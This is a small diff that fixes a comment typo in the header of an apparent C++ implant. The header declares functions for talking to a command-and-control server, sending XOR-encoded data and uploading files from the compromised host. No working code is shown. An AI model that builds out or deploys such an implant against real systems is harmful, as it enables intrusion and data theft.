@@ -24,7 +24,7 @@
 #pragma comment(lib, "urlmon.lib")
 
 // The core functions of the implant 
-// Alll of these are either used for C2 <-> implant communication or executing a task from the C2
+// All of these are either used for C2 <-> implant communication or executing a task from the C2
 
 std::string sendEncodedString(struct Strings* strings, std::string key, std::string data, std::string endpoint, HANDLE hConnect);
 BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int xorKey, std::string endpoint);
